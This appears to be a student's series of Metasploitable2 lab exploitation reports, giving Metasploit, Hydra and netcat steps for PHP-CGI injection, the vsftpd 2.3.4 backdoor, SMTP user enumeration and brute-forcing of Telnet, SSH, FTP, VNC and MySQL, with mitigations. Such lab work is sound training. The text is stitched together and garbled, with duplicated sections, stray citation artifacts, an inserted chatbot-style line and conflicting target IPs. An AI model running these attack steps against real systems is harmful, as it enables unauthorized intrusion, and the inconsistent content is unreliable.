# Metasploitable2 Exploitation Report

**Name:** Casmir Sraha
**Index Number:** 7363623
**Date:** 2026-09-20
**Target IP:** 192.168.1.3
**Attacker OS / Tools:** Kali Linux, Metasploit Framework, nmap 7.x

---

## Reconnaissance Summary
bash
nmap -sV -p 80 10.0.2.5

An `nmap` service scan targeting Port 80 revealed that the host is running **Apache httpd 2.2.8** on Ubuntu. 
Further enumeration using Metasploit's HTTP version scanner (`auxiliary/scanner/http/http_version`) identified that the web server is powered by PHP. 
Accessing `phpinfo.php` directly confirmed the detailed version running is **PHP 5.2.4-2ubuntu5.10** with Server API set to CGI/FastCGI.

---

## Exploit 1: PHP CGI Argument Injection

- **Service / Port:** HTTP / 80
- **Vulnerability:** PHP CGI Argument Injection (CVE-2012-1823 / CVE-2012-2311)
- **Tool Used:** Metasploit – `exploit/multi/http/php_cgi_arg_injection`
- **Why This Tool:** The Metasploit `php_cgi_arg_injection` module specifically targets web servers running PHP under CGI mode that fail to properly sanitize command-line flags pass-through, allowing direct execution of arbitrary PHP code.
- **Steps:**
  1. `msfconsole`
  2. `use exploit/multi/http/php_cgi_arg_injection`
  3. `set RHOSTS 192.168.1.3`
  4. `exploit`
- **Evidence:** `/home/kali/evidence/exploit_multi_http_php_cgi_arg_injection.png`
- **Cyber Kill Chain Stage(s):** Weaponization, Exploitation, C2
  - *Weaponization & Exploitation:* The exploit crafts a malicious query string passed to the PHP-CGI binary to execute arbitrary code.
  - *C2 / Execution:* A reverse Meterpreter shell session is successfully established on the target machine.
- **Outcome / Impact:** Gained interactive command execution (Meterpreter shell) on the target host as the web server service user (`www-data`).

---

## Kill Chain Coverage Summary

| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
|---|---|---|---|---|---|---|---|
| 1. PHP CGI Argument Injection | ✓ | ✓ | ✓ | ✓ | | ✓ | ✓ |

---

## Lessons Learned / Mitigations (optional but recommended)

1. **Update PHP:** Upgrade PHP to a supported version that patches the CGI argument parsing vulnerability (CVE-2012-1823).
2. **Disable Unnecessary CGI Handlers:** Avoid running PHP as a standalone CGI binary; instead, utilize modern execution methods like PHP-FPM or FastCGI with properly constrained parameter configs.

















# Metasploitable2 Exploitation Report

**Name:** Sraha Kwame Casmir
**Index Number:** 7363623
**Date:** 2026-09-20
**Target IP:** 192.168.1.3
**Attacker OS / Tools:** Kali Linux, Metasploit Framework, Wireshark, Telnet Client

---

## Reconnaissance Summary

Initial enumeration was performed by probing Port 23 (Telnet) on the target host. Because Telnet transfers network traffic in unencrypted clear text, **Wireshark** was launched on interface `eth0` to capture authentication packets during connection. By inspecting the TCP stream (`Follow > TCP Stream`), login credentials (`msfadmin:msfadmin`) were identified directly in clear text.

---



```

PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd

```

---

## Exploit 2: Telnet Cleartext Credential Reuse & Brute Force

- **Service / Port:** Telnet / 23
- **Vulnerability:** Unencrypted Cleartext Authentication / Weak Credentials
- **Tool Used:** Metasploit – `auxiliary/scanner/telnet/telnet_login`
- **Why This Tool:** The `telnet_login` scanner module automates authentication attempts against Telnet endpoints using wordlists and opens a interactive shell session once valid credentials (`msfadmin:msfadmin`) are authenticated.
- **Steps:**
  1. `msfconsole`
  2. `use auxiliary/scanner/telnet/telnet_login`
  3. `set RHOSTS 192.168.1.3`
  4. `set USER_FILE /usr/share/wordlists/metasploit/root_userpass.txt`
  5. `set PASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt`
  6. `set STOP_ON_SUCCESS true`
  7. `run`
  8. `sessions -u 1` 
  9. `sessions 2`
- **Evidence:** `/home/kali/evidence/exploit_telnet.png`
- **Cyber Kill Chain Stage(s):** Reconnaissance, Exploitation, C2
  - *Reconnaissance:* Sniffing network packets in Wireshark allowed cleartext credential recovery.
  - *Exploitation:* Automated authentication using the harvested credentials yielded interactive shell access.
  - *C2:* Upgrading the command shell to a Meterpreter session established an interactive command-and-control channel.
- **Outcome / Impact:** Gained interactive shell access to the host as user `msfadmin` and upgraded the connection to a Meterpreter C2 session.

---

## Kill Chain Coverage Summary

| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
|---|---|---|---|---|---|---|---|
| 1. Telnet Cleartext Credential Reuse | ✓ | | ✓ | ✓ | | ✓ | ✓ |

---

## Lessons Learned / Mitigations (optional but recommended)

1. **Disable Unencrypted Telnet:** Replace the legacy Telnet service with Secure Shell (SSH) to enforce strong end-to-end encryption.
2. **Enforce Password Policies:** Replace default accounts (`msfadmin:msfadmin`) with robust authentication credentials.

```

















# Metasploitable2 Exploitation Report

**Name:** Sraha Kwame Casmir
**Index Number:** 7363623
**Date:** 2026-09-20
**Target IP:** 192.168.1.3
**Attacker OS / Tools:** Kali Linux, Metasploit Framework

---

## Reconnaissance Summary

Initial enumeration was performed by checking prior Nmap scan results targeting TCP Port 22[cite: 7]. The scan confirmed that OpenSSH 4.7p1 was running on the target Debian host.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)


---

## Reconnaissance Summary

Initial enumeration was performed by checking prior Nmap scan results targeting TCP Port 22. The scan confirmed that OpenSSH 4.7p1 was running on the target Debian host.


```

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)

```

---

## Exploit 3: SSH Credential Brute Force & Login Exploitation

- **Service / Port:** SSH / 22
- **Vulnerability:** Weak / Default Credentials (Brute Force Susceptibility)
- **Tool Used:** Metasploit – `auxiliary/scanner/ssh/ssh_login`
- **Why This Tool:** The `ssh_login` auxiliary module performs automated SSH login attempts against target systems using specified user and password dictionary files, automatically opening a command shell session upon finding valid credentials.
- **Steps:**
  1. `msfconsole`
  2. `search ssh_login`
  3. `use auxiliary/scanner/ssh/ssh_login`
  4. `set RHOSTS 192.168.1.3
  5. `set USER_FILE /root/users.txt
  6. `set PASS_FILE /root/passwords.txt
  7. `set STOP_ON_SUCCESS true
  8. `exploit
  9. `sessions -u 1` (upgrades basic command shell to a Meterpreter session)
  10. `sessions 2
  11. `sysinfo
- **Evidence:** `/home/kali/evidence/exploit_ssh_login.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Exploitation, C2
  - *Reconnaissance:* Enumerating Port 22 and identifying the SSH service version.
  - *Exploitation:* Automated password dictionary attack yielding valid credentials (`msfadmin:msfadmin`).
  - *C2 / Execution:* Upgrading the active SSH shell to a Meterpreter payload session.
- **Outcome / Impact:** Discovered valid SSH credentials (`msfadmin:msfadmin`), obtained interactive shell access to the host, and successfully upgraded to a Meterpreter session.

---

## Kill Chain Coverage Summary

| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
|---|---|---|---|---|---|---|---|
| 1. SSH Credential Brute Force | ✓ | | ✓ | ✓ | | ✓ | ✓ |

---

## Lessons Learned / Mitigations (optional but recommended)

1. **Enforce Strong Passwords & Disable Defaults:** Ensure default accounts such as `msfadmin` have strong passwords or are disabled.
2. **Implement Fail2ban:** Use brute-force detection tools like `fail2ban` to lock out IP addresses attempting multiple invalid SSH logins.
3. **Use Key-Based Authentication:** Disable password authentication for SSH (`PasswordAuthentication no`) in favor of public key cryptography.

```


















# Metasploitable2 Exploitation Report

**Name:** Sraha Kwame Casmir
**Index Number:** 7363623
**Date:** 2026-09-20
**Target IP:** 192.168.1.3
**Attacker OS / Tools:** Kali Linux, Metasploit Framework, Netcat (`nc`), `smtp-user-enum`

---

## Reconnaissance Summary

Initial service discovery confirmed Port 25 (SMTP) was open on the Metasploitable2 instance running Postfix ESMTP[cite: 7]. Direct testing via Netcat (`nc 10.0.2.5 25`) confirmed that the server responds to SMTP service commands, such as `VRFY'.




PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd

```

Testing the `VRFY` command interactively confirmed active users on the system:
- `VRFY msfadmin` -> Returned `250 2.0.0 msfadmin` (User exists)
- `VRFY Pat` -> Returned `550 5.1.1 <Pat>: Recipient address rejected` (User does not exist)

---

## Exploit 4: SMTP User Enumeration & VRFY Probe

- **Service / Port:** SMTP / 25
- **Vulnerability:** Unrestricted SMTP User Enumeration / Active `VRFY` Command
- **Tool Used:** Metasploit – `auxiliary/scanner/smtp/smtp_enum` & `smtp-user-enum`]
- **Why This Tool:** The `smtp_enum` module and standalone `smtp-user-enum` tool leverage implementation mechanisms (such as `VRFY`, `EXPN`, or `RCPT TO`) to enumerate system account names without authenticating[cite: 7]. This exposes valid username accounts for subsequent credential-based attacks.
- **Steps:**
  1. Interactive verification via Netcat:
     `nc 192.168.1.8 25`
     `VRFY msfadmin
  2. Enumeration via `smtp-user-enum`:
     `smtp-user-enum -M VRFY -U users.txt -t 192.168.1.3`
  3. Automated full dictionary enumeration via Metasploit:
     `msfconsole`[
     `use auxiliary/scanner/smtp/smtp_enum`
     `set RHOSTS 192.168.1.3`
     `set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt`
     `run`
- **Evidence:** /home/kali/evidence/exploit_smtp.png
- **Cyber Kill Chain Stage(s):** Reconnaissance
  - *Reconnaissance:* Enumerating valid local system usernames (`msfadmin`, `root`, `backup`, `bin`, `daemon`, etc.) over the open SMTP service.
- **Outcome / Impact:** Discovered local user accounts registered on the system without requiring authentication, exposing target usernames for credential brute-forcing.

---

## Kill Chain Coverage Summary

| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
|---|---|---|---|---|---|---|---|
| 1. SMTP User Enumeration | ✓ | | | | | | |

---

## Lessons Learned / Mitigations (optional but recommended)

1. **Disable `VRFY` and `EXPN` Commands:** Configure the SMTP daemon (Postfix) to disable user verification commands by adding `disable_vrfy_command = yes` in `main.cf`.
2. **Restrict Internal Enumeration:** Limit SMTP access using internal firewalls or host-based access controls to prevent unauthorized network scanning and enumeration.

```















# Metasploitable2 Exploitation Report

**Name:** Sraha Kwame Casmir
**Index Number:** 7363623
**Date:** 2026-09-20
**Target IP:** 192.168.1.3
**Attacker OS / Tools:** Kali Linux, Nmap, Hydra, Searchsploit, Metasploit Framework, FTP Client

---

## Reconnaissance Summary

Service enumeration was conducted using Nmap across all ports (`nmap -p- -sV -oN MS2.txt 10.0.2.5`). Port 21 was identified as running an outdated FTP service.

---

## Reconnaissance Summary

Service enumeration was conducted using Nmap across all ports (`nmap -p- -sV -oN MS2.txt 19.168.1.3`). Port 21 was identified as running an outdated FTP service.


```

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4

```

---

## Exploit 5: FTP Credential Brute Force & Login

- **Service / Port:** FTP / 21
- **Vulnerability:** Weak Credentials / Password Dictionary Susceptibility
- **Tool Used:** Hydra
- **Why This Tool:** Hydra allows parallelized dictionary attacks against remote authentication services. Using crafted username and password wordlists (`users.txt` and `passwords.txt`), it rapidly identifies valid account credentials.
- **Steps:**
  1. Create custom wordlists:
     `nano users.txt` (containing `msfadmin`, `service`, `user`, etc.)
     `nano passwords.txt`
  2. Execute brute-force attack:
     `hydra -L users.txt -P passwords.txt 10.0.2.5 ftp`
  3. Log in interactively via FTP:
     `ftp 10.0.2.5`
     Authenticate using `msfadmin:msfadmin`
- **Evidence:** `/home/kali/evidence/exploit_ftp _via_hydra.png`
- **Cyber Kill Chain Stage(s):** Reconnaissance, Exploitation
  - *Reconnaissance:* Scanning open ports and creating targeted credential lists.
  - *Exploitation:* Automated credential guessing yielding valid login credentials (`msfadmin:msfadmin`).
- **Outcome / Impact:** Successfully obtained valid FTP login credentials and authenticated to the server filesystem.

---

## Exploit 6: vsftpd 2.3.4 Backdoor Command Execution

- **Service / Port:** FTP / 21[cite: 7]
- **Vulnerability:** vsftpd 2.3.4 Backdoor Command Execution (CVE-2011-2523)
- **Tool Used:** Searchsploit & Metasploit – `exploit/unix/ftp/vsftpd_234_backdoor`
- **Why This Tool:** The vsftpd 2.3.4 software distribution contained a known backdoor that opens a listening shell on TCP port 6200 when a username ending with `:)` is supplied during authentication. Metasploit automates this exploit sequence to deliver a root-level shell.
- **Steps:**
  1. Search for public exploits:
     `searchsploit vsftpd 2.3.4`
  2. Launch Metasploit console:
     `msfconsole`
  3. `use exploit/unix/ftp/vsftpd_234_backdoor`
  4. `set RHOSTS 192.168.1.3`
  5. `exploit`
  6. Verify session root access:
     `whoami` (returns `root`)
- **Evidence:** /home/kali/evidence/exploit_ftp_via_vspdft.png`
- **Cyber Kill Chain Stage(s):** Weaponization, Exploitation, Actions on Objectives
  - *Weaponization:* Loading the pre-packaged vsftpd backdoor exploit module.
  - *Exploitation:* Triggering the malicious FTP authentication sequence to spawn the backdoor.
  - *Actions on Objectives:* Achieving elevated `root` system privileges over a command shell.
- **Outcome / Impact:** Successfully obtained root-level command shell access to the host.

---

## Kill Chain Coverage Summary

| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
|---|---|---|---|---|---|---|---|
| 1. FTP Credential Brute Force | ✓ | | ✓ | ✓ | | | |
| 2. vsftpd 2.3.4 Backdoor | ✓ | ✓ | ✓ | ✓ | | ✓ | ✓ |

---

## Lessons Learned / Mitigations (optional but recommended)

1. **Update / Patch Software:** Upgrade `vsftpd` to a safe, supported version or replace it with a secure FTP daemon (e.g., `ProFTPD` or `SFTP`).
2. **Remove Backdoored Binaries:** Ensure software binaries originate from verified, cryptographically signed repositories.
3. **Enforce Strong Credentials:** Change default user account passwords to prevent automated dictionary attacks.

```















# Metasploitable2 Exploitation Report

**Name:** Sraha Kwame Casmir
**Index Number:** 7363623
**Date:** 2026-09-20
**Target IP:** 192.168.1.3
**Attacker OS / Tools:** Kali Linux, Nmap, Metasploit Framework, VNC Viewer (`vncviewer`)

---

## Reconnaissance Summary

Service discovery targeting TCP Port 5900 confirmed that Virtual Network Computing (VNC) protocol version 3.3 was active on the target server.

PORT     STATE SERVICE VERSION
5900/tcp open  vnc     VNC (protocol 3.3)




Here is the complete report based on the VNC exploitation walkthrough video.

```markdown
# Metasploitable2 Exploitation Report

**Name:** Sraha Kwame Casmir
**Index Number:** 7363623
**Date:** 2026-09-20
**Target IP:** 192.168.1.3
**Attacker OS / Tools:** Kali Linux, Nmap, Metasploit Framework, VNC Viewer (`vncviewer`)

---

## Reconnaissance Summary

Service discovery targeting TCP Port 5900 confirmed that Virtual Network Computing (VNC) protocol version 3.3 was active on the target server.


```

PORT     STATE SERVICE VERSION
5900/tcp open  vnc     VNC (protocol 3.3)

```

---

## Exploit 7: VNC Weak Password Brute Force & GUI Session Access

- **Service / Port:** VNC / 5900
- **Vulnerability:** Weak / Default VNC Authentication Password
- **Tool Used:** Metasploit – `auxiliary/scanner/vnc/vnc_login` & `vncviewer`
- **Why This Tool:** The `vnc_login` scanner module tests common VNC passwords against the server to locate valid authentication credentials[cite: 7]. Once a valid credential (`password`) is identified, `vncviewer` is used to launch a interactive graphical desktop session.
- **Steps:**
  1. `msfconsole`
  2. `search vnc_login`
  3. `use auxiliary/scanner/vnc/vnc_login`
  4. `set RHOSTS 192.168.1.3`
  5. `set USERNAME root`
  6. `run`
  7. Launch VNC client using the discovered password (`password`):
     `vncviewer 10.0.2.5`
  8. Enter `password` at the authentication prompt.
- **Evidence:** `evidence/exploit_vnc.png`
- **Cyber Kill Chain Stage(s):** Reconnaissance, Exploitation, Actions on Objectives
  - *Reconnaissance:* Identifying open TCP Port 5900 running VNC.
  - *Exploitation:* Automated credential checking discovering the default password `password`.
  - *Actions on Objectives:* Establishing an interactive graphical desktop session with `root` privileges on the host.
- **Outcome / Impact:** Discovered a weak default VNC password (`password`) and gained full graphical desktop access to the remote system.

---

## Kill Chain Coverage Summary

| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
|---|---|---|---|---|---|---|---|
| 1. VNC Weak Credential Exploitation | ✓ | | ✓ | ✓ | | ✓ | ✓ |

---

## Lessons Learned / Mitigations (optional but recommended)

1. **Disable Legacy VNC Services:** Replace obsolete unencrypted remote access protocols like VNC with encrypted alternatives (e.g., SSH with X11 forwarding or secure RDP).
2. **Enforce Strong Password Policies:** Change weak or default VNC passwords to long, complex passphrases.
3. **Restrict Network Access:** Implement firewall rules to block port 5900 from direct exposure to public or untrusted networks.

```
















# Metasploitable2 Exploitation Report

**Name:** Sraha Kwame Casmir
**Index Number:** 7363623
**Date:** 2026-09-20
**Target IP:** 192.168.1.3
**Attacker OS / Tools:** Kali Linux, Nmap, Metasploit Framework, MySQL Client (`mysql`)

---

## Reconnaissance Summary

Service discovery targeting TCP Port 3306 confirmed that MySQL Server version 5.0.51a was active on the target machine.


```

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.0.51a-3u1

```

---

## Exploit 8: MySQL Credential Brute Force & Remote Database Access

- **Service / Port:** MySQL / 3306
- **Vulnerability:** Unauthenticated / Blank Root Password (Weak Default Configuration)
- **Tool Used:** Metasploit – `auxiliary/scanner/mysql/mysql_login` & `mysql` client
- **Why This Tool:** The `mysql_login` module tests dictionary wordlists against the MySQL service to locate valid user credentials. Once valid credentials (`root` with an empty password) are discovered, the native MySQL client is used to establish remote database connection.
- **Steps:**
  1. `msfconsole`
  2. `search mysql_login`
  3. `use auxiliary/scanner/mysql/mysql_login`
  4. `set RHOSTS 192.168.1.3
  5. `set USER_PASS_FILE /usr/share/wordlists/metasploit/unix_users.txt`
  6. `run`[cite: 7]
  7. Connect remotely using the discovered `root` user account without password:
     `mysql -u root -h 192.168.1.3 -p`
  8. Press `Enter` at the password prompt.
  9. Enumerate databases:
     `SHOW DATABASES;`
- **Evidence:** `evidence/exploit_mysql.png`
- **Cyber Kill Chain Stage(s):** Reconnaissance, Exploitation, Actions on Objectives
  - *Reconnaissance:* Identifying open TCP Port 3306 running MySQL.
  - *Exploitation:* Automated credential checking discovering the blank `root` password.
  - *Actions on Objectives:* Logging into the database engine with full administrative (`root`) privileges to view hosted databases.
- **Outcome / Impact:** Successfully obtained administrative access to the remote MySQL database server without password authentication, permitting unrestricted database querying and potential data extraction.

---

## Kill Chain Coverage Summary

| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
|---|---|---|---|---|---|---|---|
| 1. MySQL Blank Root Credential Access | ✓ | | ✓ | ✓ | | | ✓ |

---

## Lessons Learned / Mitigations (optional but recommended)

1. **Set Strong Root Passwords:** Assign a strong administrative password to the MySQL `root` account immediately after installation using `mysql_secure_installation'.
2. **Restrict Network Binding:** Bind MySQL to `127.0.0.1` (localhost) in `my.cnf` if remote database access is not required.
3. **Firewall Access Controls:** Restrict remote access to TCP Port 3306 using network firewalls or host-based IP whitelisting.

```










# Metasploitable2 Exploitation Report

**Name:** Sraha Kwame Casmir
**Index Number:** 7363623
**Date:** 2026-09-21
**Target IP:** 19.168.1.3
**Attacker OS / Tools:** Kali Linux, Nmap, Hydra, FTP Client (`ftp`)

---

## Reconnaissance Summary

Service discovery targeting TCP Port 21 confirmed that vsftpd version 2.3.4 was running on the target system.

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4

---

## Exploit 9: FTP Credential Brute-Force via Hydra

- **Service / Port:** FTP / 21
- **Vulnerability:** Weak / Predictable User Credentials & Lack of Account Lockout
- **Tool Used:** Hydra & `ftp` client
- **Why This Tool:** Hydra is a fast, parallelized network logon attack tool capable of performing dictionary brute-force attacks against FTP authentication services.
- **Steps:**
  1. Identify target IP and service running on port 21.
  2. Execute Hydra targeting the FTP service with user and password wordlists:
     ```bash
     hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ftp://192.168.1.3
     ```
  3. Review Hydra output to locate valid credentials (e.g., `msfadmin:msfadmin` or `user:user`).
  4. Authenticate to the remote FTP server using the recovered credentials:
     ```bash
     ftp 192.168.1.3
     ```
  5. Enter the discovered username and password at the prompts.
  6. Verify successful logon and list directory contents:
     ```ftp
     ls -la
     ```
- **Evidence:** /home/kali/evidence/exploit_ftp _via_hydra.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Exploitation, Actions on Objectives
  - *Reconnaissance:* Scanning TCP Port 21 to identify the active FTP service.
  - *Exploitation:* Running Hydra dictionary attacks to brute-force valid account credentials.
  - *Actions on Objectives:* Logging into the target FTP server to view, upload, or extract remote files.
- **Outcome / Impact:** Discovered valid user credentials on the target FTP server, enabling remote unauthenticated file retrieval and upload capabilities.

---

## Kill Chain Coverage Summary

| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
|---|---|---|---|---|---|---|---|
| FTP Hydra Brute Force | ✓ | | ✓ | ✓ | | | ✓ |

---

## Lessons Learned / Mitigations

1. **Enforce Strong Password Policies:** Ensure all FTP user accounts utilize complex passwords that resist dictionary brute-force attacks.
2. **Implement Rate Limiting & Account Lockouts:** Use tools like `fail2ban` to block IP addresses after multiple failed login attempts.
3. **Use Secure Protocols:** Migrate from unencrypted FTP to secure file transfer mechanisms like SFTP (SSH File Transfer Protocol) or FTPS.

```

-
